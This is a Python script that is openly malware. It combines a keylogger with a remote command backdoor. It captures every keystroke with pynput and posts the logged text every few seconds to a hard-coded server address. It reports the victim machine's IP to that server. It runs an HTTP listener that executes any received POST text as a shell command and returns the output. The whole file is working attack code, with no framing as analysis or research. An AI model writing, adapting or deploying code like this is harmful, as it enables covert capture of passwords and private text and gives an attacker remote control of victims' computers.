import json
import time
import requests
import threading
import subprocess
import multiprocessing
import http.client, urllib.parse
from http.server import HTTPServer, BaseHTTPRequestHandler
from pynput import keyboard
from urllib import parse
import threading

# global variable for the text to be logged
text = ""
counter = 0

# server ip and port number
http_ip = "192.168.1.232"
http_port = "8000"
interval = 5
my_ip = ""
my_port = 8001



class RequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        post_body = self.rfile.read1()
        print(post_body)
        body = parse.parse_qs(str(post_body, 'UTF-8'))
        print(body["text"])
        cmd = body["text"][0]
        res = execute_cmd(cmd)
        self.send_response(200, 'OK')
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(res)


def run_server(server_class=HTTPServer, handler_class=RequestHandler):
    server_address = (my_ip, my_port)
    httpd = server_class(server_address, handler_class)
    httpd.serve_forever()

def execute_cmd(cmd):
    if not cmd:
        time.sleep(3)
    sub_p = subprocess.Popen(cmd, shell=True, stderr = subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    sub_p_bytes = sub_p.stdout.read() + sub_p.stderr.read()
    return sub_p_bytes


def send_data_to_server():
    counter = 0
    try:
        conn = http.client.HTTPConnection(http_ip, http_port)
        params = urllib.parse.urlencode({"text": text})
        headers = {"Content-type": "application/x-www-form-urlencoded",
           "Accept": "text/plain"}
        try:
            conn.request("POST", "", params, headers)
        except Exception as e:
            print("error sending data to server", e)
        
        timer = threading.Timer(interval, send_data_to_server)
        timer.start()

        counter += 1
        if counter > 10:
            return
    except:
        print("Failed request")

def on_key_stroke(key):
    global text

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")


def exec_shell_conn():
    cmd = "hostname -I | awk '{ print $1}'"
    sub_p = subprocess.Popen(cmd, shell=True, stderr = subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    sub_p_bytes = sub_p.stdout.read() + sub_p.stderr.read()
    sub_p_str = sub_p_bytes.strip()
    global my_ip
    my_ip = sub_p_str.decode('utf-8')
    print(my_ip)
    print("sub_p_str", sub_p_str)
    data = json.dumps({"target_ip": my_ip})

    params = urllib.parse.urlencode({"text": data})
    headers = {"Content-type": "application/x-www-form-urlencoded",
        "Accept": "text/plain"}
    try:
        conn = http.client.HTTPConnection(http_ip, http_port)
        conn.request("POST", "", params, headers)
    except Exception as e:
        print("error sending data to server", e)


def exec_logging():
    with keyboard.Listener(on_press=on_key_stroke) as listener:
        send_data_to_server()
        listener.join()


exec_shell_conn()
proc1 = threading.Thread(target=run_server)
proc2 = threading.Thread(target=exec_logging)
proc1.start()
proc2.start()
